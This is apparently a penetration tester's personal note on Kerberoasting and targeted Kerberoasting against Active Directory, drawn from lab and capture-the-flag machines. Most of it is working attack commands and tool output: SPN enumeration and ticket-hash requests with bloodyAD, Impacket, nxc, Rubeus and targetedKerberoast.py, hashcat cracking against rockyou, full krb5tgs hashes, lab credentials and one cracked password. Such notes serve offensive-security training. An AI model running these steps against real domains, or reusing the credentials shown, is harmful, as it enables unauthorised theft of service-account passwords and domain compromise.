---
publish: true
created: 2026-03-02T17:50:27.640+05:30
modified: 2026-06-21T20:11:01.488+05:30
---

# Kerberoasting

For this to be possible, mainly **ServicePrincipleName (SPN)** needs to be set, like an alias for the service accounts.

![[Attachments/000-Concepts/AD/Kerberoasting/IMG-Kerberoasting-20260302175153610.png]]

This is at TGS-REP in the diagram.

## bloodyad

You can enumerate which accounts have spns set.

```
$ bloodyAD -H NAGOYA.nagoya-industries.com -d nagoya-industries.com -u Fiona.Clark -p Summer2023 msldap spns
svc_helpdesk
krbtgt
svc_mssql
```

## Impacket

1. Check the accounts which have SPN set.

```
$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.1.101
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 00:36:40.351723  2026-03-02 12:00:42.409351
```

2. Save the hash to file.

```
$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.1.101 -request-user Administrator -outputfile administrator.out
```

3. crack the password.

```
$ hashcat -m 13100 administrator.out /usr/share/wordlists/rockyou.txt -a 0 --show
```

## nxc

- via nxc

```bash
nxc ldap $IP -u user -p passwd --kerberoasting kerberoast.txt --kdchost dc01.oscp.exam
```

## Rubeus

### save hash

You need a shell. You don't need to know the password.

```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

```
PS C:\ProgramData> .\Rubeus.exe kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : access.offsec
[*] Searching path 'LDAP://SERVER.access.offsec/DC=access,DC=offsec' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 5/21/2022 5:33:45 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$CC
                             083BC1F2D70D05142F18064286E06D$74F825DACAE41C77EEFDD3900AAC8563B45F743517DDF5E7A
                             6CFFC5C6DCFFBC9238214A9FC34DC8555094DF8C0755737286FCA66672410370E8ADFCECA49DAB78
                             2124D327D402022A1409EFD696F91D8D9D809D1F4F4624E03B2164F5203352E1394199825933674A
                             66933A41C10B2D37A4269D561C68CABB197A29FD217492C76D439F3492AF08D791F42432A02F2FBA
                             64A71172D93B209FDFD1F7256B7341E80502EA89C40DFBAC800FD572097C822C8871AB94F5232F87
                             C87B82CFE93CC9CAE57F276B9A5676EC7CB623DA960B4E1473EB2DE77A3E0DF017DAD980F4957AA4
                             2FE26AE42BD5EEA71BAF7F8345BB4FC9F0CDB234FC6494E5C3E0797DAC8540D347796D576E01740D
                             E99D847E03C2CFC634F554A874D88AB84C31A5FC669F23C3285EAC83DF1F769AF149617D8C728364
```

# Targeted Kerberoasting

the attacker uses an account with privileges and sets a SPN for victim account, and makes it kerberoastable. in below example, the attacking user account has _GenericWrite_ over victim.

```
$ targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$64fa251efbdaf75739da1c398b7ec443$4a9ab2a055181eb680135486874c57d66c4028ffa715054f716c3b3eb0608b16080ebb6e2d2960920e1b532cedc447a81790d367a6e6d3f9c602c2949f0b9dacc5ec0bc4f0a95e54e04a4cc7ed98518092bfe48b950035e9dd30597cb99d60a8032fc8d7fad4559866b172940e802ae7e54da38624d3a5647581f3dcaaf728553e08d6773638f86211a57e59f5ba3e940d9660cdec28967ea7fa6f5dce3b09bb01090e35fbc2bebc29dcb7cd88106b820358058628372a50b569fbdb564c792ebefdce16f60a49c2d09d667209632407335039f289ab9bb251794dacc11c0910a63e51acb175c2872c60f9d7a33d9c8d3a7135bd3b2b8029bfb8d0976c0ebd4d373b91c860029e7c8983adf3aa8e37aba5e9301031a1e434a4d38c3e89bcf36c0c261676952abd2a2cb9e4fe0725e84ef9deb6ba0fc8afe57273dcea4f4fac54f013a645ba3d2c0c8e3f622bdd8fba5e9487e70bea06acf7f8c4670d0b819319730f0f4484803c23a740842d938f53f5ff3711ed828ea030183017736082027ebe21e34809f571b0e8c1875b715414b2ed1742d9abb1b437b00c2e462892e5b41e1a88732e934e7d507f24291682a9da9a98d8cadaf6c45a57b8c86c1d1f9181d7ac2264de5e9014c6f3a8bf906bd0e68b482798ae633bd9b745442a8713cb8b69f4b0e64d0ada3b11f06abbfb6c98f6863d95df96b0adcd9233e5cc90ab07fe5a81ef53d3126a5ea90efd2b1c2a0ba35fb40b2cd385d167e69c01e6582fe2765b30884b9d12a996e32d0635fbd3f883b42474babd3bd0fc684b5f5df1fa7b1f2f1e934491f2c1da64218f40eec528b3cfae4a97c8d10dd51f5217c48ad549e03a7f584fd3c8773ea20513ae9992596877c68225a0a62da2d3bdbb97a5215bc56b8bfefcbd051de9f624831982b97e506398175830ce7a9b8111a9e7b8930c801570516598daa06f3e4ec11d96329ea58fa2840a5210448ffba72a8b2073aaab90cdb44a37eb5b190d163c8547791136bbeb85f34d7e38cc37de0da1b9699d6f91cd52971c25fba7ab040dc62a3cf1508e8f38d8765f39f7c0712835c3686f10b398e4b1673fa7f3ac49a503d16f04d71a0864f7ff1833ac569a9debc5ce1b08fbd599f077d1087776dd4f0ba0caf92bcb370d8708587eec8bf7fc594b581d846b00a8b4a36d7efa04baa816da28e3ccf0252f71d3928dc8c5105ee6f0fbbe09c13b475ac7b30680a7e8bbb59b5e9842e01b4dfbb241af99718c0b9999c148114892a3d46ebf9e087ce08342fa51004fab3e05b0a3c9983966156f6f1095a714b2c106486780beb03f18f231baaefd9c6c74f37fa885699fff93bdd851978ed1a2d3b30eaa505911cdbd1480f1b60fa4ba11e4504c1db6c26dedee73a32b38410aaf2284954acbe20161a7a2c445545697d2a623fbde56fdeae096327573335eba1dabdda7f69d62947d28c4012cd1c0097f7e14ebb6a3229c91b46e6003cb420caa91090b3715f3a567c9cb309aadc4c9668dbf875558cf7d244e7ca2d4d6
[VERBOSE] SPN removed successfully for (ethan)
```

save the hash and crack it with hashcat.

```
$ hashcat -m 13100 ethan.out /usr/share/wordlists/rockyou.txt -a 0 --show
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$64fa251efbdaf75739da1c398b7ec443$4a9ab2a055181eb680135486874c57d66c4028ffa715054f716c3b3eb0608b16080ebb6e2d2960920e1b532cedc447a81790d367a6e6d3f9c602c2949f0b9dacc5ec0bc4f0a95e54e04a4cc7ed98518092bfe48b950035e9dd30597cb99d60a8032fc8d7fad4559866b172940e802ae7e54da38624d3a5647581f3dcaaf728553e08d6773638f86211a57e59f5ba3e940d9660cdec28967ea7fa6f5dce3b09bb01090e35fbc2bebc29dcb7cd88106b820358058628372a50b569fbdb564c792ebefdce16f60a49c2d09d667209632407335039f289ab9bb251794dacc11c0910a63e51acb175c2872c60f9d7a33d9c8d3a7135bd3b2b8029bfb8d0976c0ebd4d373b91c860029e7c8983adf3aa8e37aba5e9301031a1e434a4d38c3e89bcf36c0c261676952abd2a2cb9e4fe0725e84ef9deb6ba0fc8afe57273dcea4f4fac54f013a645ba3d2c0c8e3f622bdd8fba5e9487e70bea06acf7f8c4670d0b819319730f0f4484803c23a740842d938f53f5ff3711ed828ea030183017736082027ebe21e34809f571b0e8c1875b715414b2ed1742d9abb1b437b00c2e462892e5b41e1a88732e934e7d507f24291682a9da9a98d8cadaf6c45a57b8c86c1d1f9181d7ac2264de5e9014c6f3a8bf906bd0e68b482798ae633bd9b745442a8713cb8b69f4b0e64d0ada3b11f06abbfb6c98f6863d95df96b0adcd9233e5cc90ab07fe5a81ef53d3126a5ea90efd2b1c2a0ba35fb40b2cd385d167e69c01e6582fe2765b30884b9d12a996e32d0635fbd3f883b42474babd3bd0fc684b5f5df1fa7b1f2f1e934491f2c1da64218f40eec528b3cfae4a97c8d10dd51f5217c48ad549e03a7f584fd3c8773ea20513ae9992596877c68225a0a62da2d3bdbb97a5215bc56b8bfefcbd051de9f624831982b97e506398175830ce7a9b8111a9e7b8930c801570516598daa06f3e4ec11d96329ea58fa2840a5210448ffba72a8b2073aaab90cdb44a37eb5b190d163c8547791136bbeb85f34d7e38cc37de0da1b9699d6f91cd52971c25fba7ab040dc62a3cf1508e8f38d8765f39f7c0712835c3686f10b398e4b1673fa7f3ac49a503d16f04d71a0864f7ff1833ac569a9debc5ce1b08fbd599f077d1087776dd4f0ba0caf92bcb370d8708587eec8bf7fc594b581d846b00a8b4a36d7efa04baa816da28e3ccf0252f71d3928dc8c5105ee6f0fbbe09c13b475ac7b30680a7e8bbb59b5e9842e01b4dfbb241af99718c0b9999c148114892a3d46ebf9e087ce08342fa51004fab3e05b0a3c9983966156f6f1095a714b2c106486780beb03f18f231baaefd9c6c74f37fa885699fff93bdd851978ed1a2d3b30eaa505911cdbd1480f1b60fa4ba11e4504c1db6c26dedee73a32b38410aaf2284954acbe20161a7a2c445545697d2a623fbde56fdeae096327573335eba1dabdda7f69d62947d28c4012cd1c0097f7e14ebb6a3229c91b46e6003cb420caa91090b3715f3a567c9cb309aadc4c9668dbf875558cf7d244e7ca2d4d6:limpbizkit
```
